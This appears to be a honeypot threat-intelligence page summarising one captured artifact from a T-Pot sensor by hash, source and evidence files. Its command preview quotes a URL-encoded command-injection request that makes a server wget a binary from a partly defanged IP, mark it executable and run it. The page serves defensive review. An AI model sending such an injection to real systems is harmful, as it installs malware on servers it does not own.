# ae61a3630dac500b86ea7fa628d3de1c5f788d23b317e0a588a6b84d73aab5c0

High-signal T-Pot artifact published for human review.

## Summary

| Field | Value |
|---|---|
| SHA256 | `ae61a3630dac500b86ea7fa628d3de1c5f788d23b317e0a588a6b84d73aab5c0` |
| Source | T-Pot / Oraculo SOC legacy review |
| Status | high-signal candidate |
| Evidence | commands, iocs, metadata |

## Why it is visible

This artifact matched useful defensive signals such as downloader behavior, command execution, IOC presence, metadata, or detection notes.

It is published here so the repository shows the actual observed volume instead of hiding everything behind a summary.

## Command preview

```text
GET /?redirect=$1?cd+%2Ftmp%3B+rm+x86%3B+wget+http%3A%2F%2F31[.]56[.]209.XXX%2Fx86%3B+chmod+777+x86%3B.%2Fx86+nginx%3B HTTP/
```

## Evidence files

- `evidence/commands.defanged.txt`
- `evidence/iocs.defanged.json`
- `metadata/metadata.json`
- `detections.md`

Some files may be absent when the original artifact did not include that specific evidence type.

## Safety

Commands and IOCs are defanged for public defensive review. Do not execute captured payload material.
